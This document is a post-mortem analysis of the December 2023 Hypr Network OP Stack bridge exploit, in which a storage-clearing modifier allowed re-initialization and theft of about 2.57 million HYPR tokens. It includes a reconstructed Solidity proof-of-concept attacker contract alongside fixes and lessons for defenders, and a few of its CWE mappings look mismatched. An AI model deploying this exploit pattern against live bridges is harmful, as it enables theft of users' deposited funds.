# Hypr Network — OP Stack Bridge Re-initialization Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-12-13 |
| **Protocol** | Hypr Network (OP Stack-based L2 Bridge) |
| **Chain** | Ethereum (L1) |
| **Loss** | ~$220,000 (2,570,000 HYPR tokens → swapped to 97 ETH) |
| **Attacker 1** | [0x5b8D...D1BE](https://etherscan.io/address/0x5b8d598b354f5760b2a65f492154e7a3df46d1be) |
| **Attacker 2** | [0x3ea6...0519](https://etherscan.io/address/0x3ea6ba6d3415e4dfd380516c799aafa94e420519) |
| **Attack Contract** | [0xbA6f...EB77](https://etherscan.io/address/0xbA6fA6e8500cD8eEDa8EbB9DFbCC554fF4A3EB77) |
| **Attack Tx** | [0x51ce...f65](https://etherscan.io/tx/0x51ce3d9cfc85c1f6a532b908bb2debb16c7569eb8b76effe614016aac6635f65) |
| **Vulnerable Contract** | [0x40C3...595e (L1ChugSplashProxy)](https://etherscan.io/address/0x40C31236B228935b0329eFF066B1AD96e319595e) |
| **Implementation Contract** | [0xE468...c99C (L1StandardBridge)](https://etherscan.io/address/0xE468B43b4ae4d750cd6a5d7edacc1a751302c99c) |
| **Root Cause** | The `clearLegacySlot` modifier resets `Initializable`'s initialization flag (storage slot 0), allowing re-initialization |
| **PoC Source** | [DeFiHackLabs — Not registered (independent analysis)](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

Hypr Network is an Ethereum L2 rollup chain built by forking Optimism's OP Stack. Its bridge contract was exploited just 2 days after launch.

The core of the attack lies in **deploying unfinished code from a development branch (`develop`) to production**. The `L1StandardBridge.sol` on that branch contained a `clearLegacySlot` modifier temporarily added for legacy storage slot migration. This modifier had the side effect of forcibly resetting the initialization flag (storage slot 0) of the OpenZeppelin `Initializable` pattern to `0`.

This side effect allowed an external attacker to **re-invoke** the `initialize()` function of the already-initialized bridge contract. The attacker replaced the `messenger` variable with a contract they controlled, then bypassed the `finalizeBridgeERC20()`'s `onlyOtherBridge` guard to illegitimately withdraw 2,570,000 HYPR tokens locked in the bridge.

The Optimism team patched this vulnerability in the `develop` branch in October 2023, but Hypr Network deployed the vulnerable development branch as-is rather than the patched release version. The vulnerability did not exist in the officially governance-approved version.

---

## 2. Vulnerable Code Analysis

### 2.1 clearLegacySlot modifier — Core Vulnerability

**Vulnerable code (OP Stack develop branch, commit 6c7baf9e, v1.3.1)**

```solidity
// ❌ Vulnerability: temporary modifier for legacy storage migration
// Forcibly stores 0 at storage slot 0,
// which overlaps with Initializable contract's initialization flags (_initialized, _initializing)
modifier clearLegacySlot() {
    assembly {
        sstore(0, 0)  // ❌ Overwrites slot 0 with 0, resetting the _initialized flag
    }
    _;
}

// ❌ Vulnerability: this function is public, and reinitializer(2) is checked after clearLegacySlot executes
// Because clearLegacySlot reset _initialized to 0, the reinitializer(2) condition passes
// → Attacker can re-initialize with an arbitrary address for _messenger
function initialize(CrossDomainMessenger _messenger) public clearLegacySlot reinitializer(2) {
    __StandardBridge_init({ _messenger: _messenger });
}

// ❌ Result: messenger variable is replaced with the attacker's contract address
// → onlyOtherBridge modifier trusts the attacker's contract
```

**Fixed code (OP Stack develop branch, commit f4a234c2, v1.4.0)**

```solidity
// ✅ Fix: clearLegacySlot modifier removed
// Uses Constants.INITIALIZER to avoid hard-coding the initialization version value
// Manages the N value of reinitializer(N) as a constant to ensure it is updated with each new contract deployment
function initialize(CrossDomainMessenger _messenger) public reinitializer(Constants.INITIALIZER) {
    // ✅ Uses only the standard OpenZeppelin initialization pattern without the clearLegacySlot modifier
    __StandardBridge_init({ _messenger: _messenger });
}
```

**The problem**: The `sstore(0, 0)` inline assembly in the `clearLegacySlot` modifier initializes storage slot 0. In the OpenZeppelin `Initializable` pattern, slot 0 stores `_initialized` (current initialization version number) and `_initializing` (reentrancy prevention flag) via bit-packing. Forcibly overwriting it with `0` reverts the contract to a state as if it had never been initialized, neutralizing the `reinitializer(2)` guard as well.

### 2.2 onlyOtherBridge modifier — Secondary Bypass Target

```solidity
// StandardBridge.sol (vulnerable version)

// ❌ Vulnerability: messenger is a mutable state variable, so it can be replaced via re-initialization
CrossDomainMessenger public messenger;  // Stored in storage (attacker can overwrite)

// onlyOtherBridge trusts messenger; when messenger is replaced with attacker's contract, it is bypassed
modifier onlyOtherBridge() {
    require(
        // ❌ msg.sender == attacker_contract (because messenger was replaced via re-initialization)
        msg.sender == address(messenger) &&
        // ❌ attacker contract returns the OTHER_BRIDGE address via xDomainMessageSender()
            messenger.xDomainMessageSender() == address(OTHER_BRIDGE),
        "StandardBridge: function can only be called from the other bridge"
    );
    _;
}

// ❌ Result: attacker can completely bypass the onlyOtherBridge guard and withdraw tokens
function finalizeBridgeERC20(
    address _localToken,
    address _remoteToken,
    address _from,
    address _to,
    uint256 _amount,
    bytes calldata _extraData
) public onlyOtherBridge {
    // ...token transfer logic
}
```

```solidity
// ✅ Comparison with safe design pattern (using immutable)
// StandardBridge.sol at commit 65ec61dde (using immutable variables)

// ✅ Declaring as immutable prevents changes after deployment → cannot be replaced even via re-initialization
CrossDomainMessenger public immutable MESSENGER;

modifier onlyOtherBridge() {
    require(
        msg.sender == address(MESSENGER) &&  // ✅ Trusts only the immutable address
            MESSENGER.xDomainMessageSender() == address(OTHER_BRIDGE),
        "StandardBridge: function can only be called from the other bridge"
    );
    _;
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker 2 (0x3ea6) sourced ETH from FixedFloat and funded Attacker 1 (0x5b8D)
- Deployed attack contract (0xbA6f) — containing logic to re-invoke `initialize()` and call `finalizeERC20Withdrawal()`
- Attack contract was implemented to return the `OTHER_BRIDGE` address when `xDomainMessageSender()` is called

### 3.2 Execution Phase

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│                         Hypr Network Bridge Attack Flow                          │
└──────────────────────────────────────────────────────────────────────────────────┘

  Attacker EOA             Attack Contract            L1ChugSplashProxy          HYPR Token
 (0x3ea6)                 (0xbA6f)                (L1StandardBridge)           (0x31ad)
     │                        │                          │                         │
     │  ① Deploy attack contract                         │                         │
     │──────────────────────▶│                          │                         │
     │                        │                          │                         │
     │  ② Call attack()       │                          │                         │
     │──────────────────────▶│                          │                         │
     │                        │                          │                         │
     │                        │  ③ Call initialize()     │                         │
     │                        │  (msg.sender = attack contract)                    │
     │                        │  _messenger = 0xbA6f    │                         │
     │                        │─────────────────────────▶                         │
     │                        │                          │                         │
     │                        │    clearLegacySlot:      │                         │
     │                        │    sstore(0, 0) executes │                         │
     │                        │    → _initialized = 0    │                         │
     │                        │    reinitializer(2) passes                         │
     │                        │    messenger = 0xbA6f    │                         │
     │                        │◀─────────────────────────│                         │
     │                        │                          │                         │
     │                        │  ④ Call finalizeERC20Withdrawal()                  │
     │                        │  _l1Token = HYPR (0x31ad)                          │
     │                        │  _to = Attacker1 (0x5b8D)                          │
     │                        │  _amount = 2,570,000    │                         │
     │                        │─────────────────────────▶                         │
     │                        │                          │                         │
     │                        │    onlyOtherBridge check: │                        │
     │                        │    msg.sender == messenger? ✓ (0xbA6f == 0xbA6f)  │
     │                        │    messenger.xDomainMessageSender() == OTHER_BRIDGE?│
     │                        │    ✓ (attack contract returns OTHER_BRIDGE)        │
     │                        │    → Check passed! Guard bypassed                 │
     │                        │                          │                         │
     │                        │                          │  ⑤ Transfer 2,570,000 HYPR
     │                        │                          │────────────────────────▶│
     │                        │                          │  safeTransfer(Attacker1) │
     │                        │                          │                         │
     │                        │◀─────────────────────────│◀────────────────────────│
     │                        │                          │                         │
     │  ⑥ Swap HYPR → ETH     │                          │                         │
     │  (1inch Aggregator)    │                          │                         │
     │◀──────────────────────│                          │                         │
     │                        │                          │                         │
     │  ⑦ 97 ETH profit       │                          │                         │
     │  (~$220,000)           │                          │                         │
     ▼                        ▼                          ▼                         ▼
```

### 3.3 Outcome

| Field | Details |
|------|------|
| Tokens Stolen | 2,570,000 HYPR |
| Attack Block | 18,774,585 |
| Attack Time | 2023-12-13 03:30:35 UTC |
| ETH Converted | 97.21 ETH |
| Dollar Loss | ~$220,000 (based on HYPR price of $0.0855 at the time) |
| HYPR Price Impact | ~40% drop after attack announcement |
| ETH Movement | Attacker 1 → `0x41dc1916...` (April 2024) |

---

## 4. PoC Code Excerpt

No official DeFiHackLabs PoC has been registered, but the core logic reproducing the attack mechanism is as follows:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

// PoC Reproduction Code — Hypr Network Bridge Re-initialization Attack
// Vulnerability: L1StandardBridge's clearLegacySlot modifier + reinitializer(2)

// Attack contract interface
interface IL1StandardBridge {
    // ① Re-initialization target function — re-callable due to clearLegacySlot
    function initialize(address _messenger) external;
    // ② Final token withdrawal function — has onlyOtherBridge guard but can be bypassed
    function finalizeERC20Withdrawal(
        address _l1Token,
        address _l2Token,
        address _from,
        address _to,
        uint256 _amount,
        bytes calldata _extraData
    ) external;
    // Check L2 bridge address locked in the bridge
    function l2TokenBridge() external view returns (address);
}

// Attacker contract that impersonates xDomainMessageSender() as OTHER_BRIDGE
contract HyprAttacker {
    address public immutable L1_BRIDGE;   // Vulnerable L1StandardBridge
    address public immutable L2_BRIDGE;   // L2 bridge address (OTHER_BRIDGE)
    address public immutable HYPR_TOKEN;  // Target HYPR token to steal

    constructor(address _l1Bridge, address _l2Bridge, address _hyprToken) {
        L1_BRIDGE = _l1Bridge;
        L2_BRIDGE = _l2Bridge;
        HYPR_TOKEN = _hyprToken;
    }

    // ④ onlyOtherBridge bypass: xDomainMessageSender() returns L2_BRIDGE
    function xDomainMessageSender() external view returns (address) {
        // Attack core: attack contract itself impersonates CrossDomainMessenger
        // msg.sender == address(this) (messenger check passes)
        // this.xDomainMessageSender() == L2_BRIDGE (OTHER_BRIDGE check passes)
        return L2_BRIDGE;
    }

    function attack(address victim) external {
        // ③ Re-initialize: set _messenger to attack contract (itself)
        // Succeeds because clearLegacySlot removed the _initialized flag via sstore(0,0)
        IL1StandardBridge(L1_BRIDGE).initialize(address(this));

        // ④ Token withdrawal: bypass onlyOtherBridge guard
        // msg.sender = address(this) == messenger (value set via re-initialization) ✓
        // messenger.xDomainMessageSender() == L2_BRIDGE (OTHER_BRIDGE) ✓
        IL1StandardBridge(L1_BRIDGE).finalizeERC20Withdrawal(
            HYPR_TOKEN,    // L1 token address
            address(0),    // L2 token address (arbitrary value)
            victim,        // from: victim address (user who deposited tokens in bridge)
            msg.sender,    // to: attacker wallet receives HYPR
            2_570_000e18,  // Total HYPR amount deposited in the bridge
            ""
        );

        // ⑥ Swap HYPR → ETH (using 1inch Aggregation Router v5)
        // The actual attack transaction calls swap() to convert HYPR to ETH
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Re-initialization allowed (side effect of clearLegacySlot modifier) | CRITICAL | CWE-665: Improper Initialization |
| V-02 | Access control bypass (onlyOtherBridge guard bypass) | CRITICAL | CWE-284: Improper Access Control |
| V-03 | Unfinished code deployed to production (development branch used) | HIGH | CWE-1283: Mutable Attestation or Measurement Reporting Data |
| V-04 | Critical trust addresses declared as mutable state variables | HIGH | CWE-672: Operation on a Resource after Expiration or Release |

### V-01: Re-initialization Allowed

- **Description**: The `clearLegacySlot` modifier overwrites storage slot 0 with `0` via inline assembly, invalidating the `_initialized` flag of the `Initializable` contract. This neutralizes the `reinitializer(2)` guard, allowing an attacker to re-invoke the `initialize()` function.
- **Impact**: Attacker can replace the `messenger` state variable with an arbitrary address → complete collapse of the bridge's trust model.
- **Attack Conditions**: The `initialize()` function is exposed as `public`, the `clearLegacySlot` modifier exists, and tokens are deposited in the bridge.

### V-02: Access Control Bypass (onlyOtherBridge)

- **Description**: `messenger` is declared as a regular state variable (`CrossDomainMessenger public messenger`) rather than `immutable`, so upon re-initialization via V-01, it can be replaced with an address controlled by the attacker. Since `onlyOtherBridge` trusts `messenger`, the guard is neutralized.
- **Impact**: Unauthorized withdrawal of all tokens locked in the bridge.
- **Attack Conditions**: V-01 vulnerability must precede. Attacker contract must implement `xDomainMessageSender()` to return the `OTHER_BRIDGE` address.

### V-03: Unfinished Code Deployed to Production

- **Description**: Despite source code comments in the `clearLegacySlot` modifier explicitly stating "The fix modifier should be removed during the next contract upgrade," Hypr Network deployed this code to the production environment. They used the `develop` branch directly instead of the official Optimism governance-approved release.
- **Impact**: The attack would have been impossible if they had used a release version where the existing vulnerability was resolved.
- **Attack Conditions**: When forking an open-source protocol, failure to distinguish between development and release branches.

### V-04: Critical Trust Addresses Declared as Mutable State Variables

- **Description**: The `messenger` and `OTHER_BRIDGE` addresses are critical security parameters that must not be changed after deployment. In the vulnerable version, `messenger` was declared as a regular state variable while `OTHER_BRIDGE` was declared as `immutable`, creating an inconsistency.
- **Impact**: `messenger` provides an attack vector that can be changed via re-initialization.
- **Attack Conditions**: `messenger` is declared as non-immutable.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Immediately remove the clearLegacySlot modifier
// Vulnerable code
modifier clearLegacySlot() {
    assembly {
        sstore(0, 0)  // ❌ Never use — destroys the Initializable flag
    }
    _;
}
function initialize(CrossDomainMessenger _messenger) public clearLegacySlot reinitializer(2) {
    __StandardBridge_init({ _messenger: _messenger });
}

// Fixed code (identical to Optimism official patch v1.4.0)
function initialize(CrossDomainMessenger _messenger) public reinitializer(Constants.INITIALIZER) {
    // ✅ Perform only standard initialization without clearLegacySlot
    __StandardBridge_init({ _messenger: _messenger });
}
```

```solidity
// ✅ Fix 2: Declare messenger as immutable (long-term structural improvement)
// Vulnerable declaration
CrossDomainMessenger public messenger;  // ❌ Can be changed via re-initialization

// Fixed declaration
CrossDomainMessenger public immutable MESSENGER;  // ✅ Cannot be changed after deployment

// Set only in constructor
constructor(address payable _messenger) {
    MESSENGER = CrossDomainMessenger(_messenger);  // ✅ Set only once
}

// onlyOtherBridge also updated to reference MESSENGER (immutable)
modifier onlyOtherBridge() {
    require(
        msg.sender == address(MESSENGER) &&  // ✅ References immutable address
            MESSENGER.xDomainMessageSender() == address(OTHER_BRIDGE),
        "StandardBridge: function can only be called from the other bridge"
    );
    _;
}
```

```solidity
// ✅ Fix 3: Strengthen access restriction on initialize() function
function initialize(CrossDomainMessenger _messenger) 
    external  // Change public → external (if internal calls are not required)
    onlyOwner  // Or onlyProxyAdmin — only proxy admin can call
    reinitializer(Constants.INITIALIZER) 
{
    __StandardBridge_init({ _messenger: _messenger });
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Re-initialization allowed | Never use `sstore(0, 0)` for legacy storage migration; use a dedicated migration script |
| V-02: Access control bypass | Declare critical trust addresses (`messenger`, `OTHER_BRIDGE`) as `immutable` |
| V-03: Development branch deployed | When forking open-source projects, always use only tagged release versions or governance-approved versions |
| V-04: Mutable trust addresses | Apply Timelock when changing critical parameters of bridge contracts |
| Common | Mandatory professional audit before bridge launch; operate a whitehat bug bounty program |

---

## 7. Lessons Learned

1. **Development branches are not production code**: When forking open-source protocols (especially core infrastructure like OP Stack, Ethereum, etc.), you must always use only official release tags or governance-approved versions. If code contains comments like "not ready for production" or "should be removed," that code must never go to production.

2. **Temporary workaround code is a time bomb**: `clearLegacySlot` was a temporary solution for legacy storage migration. Temporary code can become a security threat rather than just technical debt, and a removal plan must be established immediately after use and reviewed before deployment.

3. **Critical security parameters must always be declared as immutable**: Addresses constituting the bridge's trust model, such as `messenger` and `OTHER_BRIDGE`, must never be changed after deployment. Using the `immutable` keyword makes them resistant even to re-initialization attacks.

4. **Understand the internal workings of the Initializable pattern**: OpenZeppelin `Initializable`'s initialization flag is stored in storage slot 0. Code that directly manipulates slot 0 for legacy compatibility can conflict with the `Initializable` pattern and requires extreme caution.

5. **Actively track security patches for dependencies in use**: The Optimism team patched this vulnerability in October 2023. If Hypr Network had tracked the latest security patches for its dependencies, the attack could have been prevented. Subscribing to security patches, performing regular dependency updates, and monitoring upstream changes are essential.

6. **Contracts that hold assets require an audit before launch**: Bridges directly hold users' assets. This incident, which occurred just 2 days after launch, demonstrates how dangerous it is to deploy asset-holding contracts without sufficient auditing.

---

## 8. On-Chain Verification

### 8.1 Attack Transaction Basic Information

| Field | Value |
|------|-----|
| Attack Tx Hash | `0x51ce3d9cfc85c1f6a532b908bb2debb16c7569eb8b76effe614016aac6635f65` |
| Block Number | 18,774,585 |
| Timestamp | 2023-12-13 03:30:35 UTC |
| From | `0x3Ea6BA6d3415E4DFD380516c799aAfa94e420519` (Hypr Exploiter 2) |
| To | `0xbA6fA6e8500cD8eEDa8EbB9DFbCC554fF4A3EB77` (Attack Contract) |
| Called Function | `swap(address router, address middle1)` (Method ID: 0x6b76484e) |
| Gas Used | 143,313 / 1,000,000 (14.33%) |

### 8.2 PoC vs On-Chain Amount Comparison

| Field | Analyzed Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| HYPR Tokens Stolen | 2,570,000 HYPR | 2,570,000 HYPR | ✓ |
| ETH Converted | ~97 ETH | 97.21 ETH | ✓ |
| Dollar Loss | $220,000 ~ $425,335 | ~$220,000 (based on actual market price at the time) | ✓ |

### 8.3 On-Chain Event Log Sequence

1. **`initialize()` call** — Re-initialization of `L1ChugSplashProxy` (vulnerable bridge contract)
2. **`finalizeERC20Withdrawal()` call** — `onlyOtherBridge` guard bypassed
3. **`Transfer` event** — 2,570,000 HYPR tokens transferred from L1ChugSplashProxy → Attacker 1 (0x5b8D)
4. **`swap()` call** — HYPR → ETH swap via 1inch Aggregation Router v5
5. **ETH received** — Attacker 1 (0x5b8D) receives approximately 97.21 ETH

### 8.4 Precondition Verification

- At the time of the attack, two legitimate users had deposited a total of 2,570,000 HYPR into the L1ChugSplashProxy.
- The attacker was able to execute the attack without any prior separate `approve` (the bridge was already holding the tokens).
- The attack contract (0xbA6f) was pre-configured to implement the `xDomainMessageSender()` interface and return the `OTHER_BRIDGE` address.

### 8.5 Vulnerable Contract Information

| Field | Address |
|------|------|
| L1ChugSplashProxy (Bridge Proxy) | [0x40C31236B228935b0329eFF066B1AD96e319595e](https://etherscan.io/address/0x40C31236B228935b0329eFF066B1AD96e319595e) |
| L1StandardBridge (Implementation) | [0xE468B43b4Ae4D750Cd6a5D7EdACC1A751302c99C](https://etherscan.io/address/0xE468B43b4Ae4D750Cd6a5D7EdACC1A751302c99C) |
| HYPR Token | [0x31adda225642a8f4d7e90d4152be6661ab22a5a2](https://etherscan.io/address/0x31adda225642a8f4d7e90d4152be6661ab22a5a2) |
| Attack Contract | [0xbA6fA6e8500cD8eEDa8EbB9DFbCC554fF4A3EB77](https://etherscan.io/address/0xbA6fA6e8500cD8eEDa8EbB9DFbCC554fF4A3EB77) |

### 8.6 Pattern DB Update Notice

The **"Initializable flag neutralization via legacy migration modifier"** pattern discovered in this incident should be considered for addition as a separate case in `patterns/08_initialization.md`. Existing initialization vulnerability patterns primarily cover uninvoked initializers or unauthorized initialization, but this incident represents a new type: **initialization flag reset as a side effect of a modifier**.

---

**References**
- [Hypr Network — REKT](https://rekt.news/hypr-network-rekt)
- [Hyper's OP Stack Bridge Exploit Analysis — Verichains](https://blog.verichains.io/p/hypers-op-stack-bridge-exploit-analysis)
- [The OP Stack Bridge Exploit Cost Hypr Network $420,000 — CryptoNews](https://cryptonews.net/news/security/28161248/)
- [Vulnerable commit (6c7baf9e) — ethereum-optimism/optimism](https://github.com/ethereum-optimism/optimism/blob/6c7baf9e/packages/contracts-bedrock/src/L1/L1StandardBridge.sol)
- [Patch commit (f4a234c2) — ethereum-optimism/optimism](https://github.com/ethereum-optimism/optimism/blob/f4a234c2/packages/contracts-bedrock/src/L1/L1StandardBridge.sol)
- [Attack transaction — Etherscan](https://etherscan.io/tx/0x51ce3d9cfc85c1f6a532b908bb2debb16c7569eb8b76effe614016aac6635f65)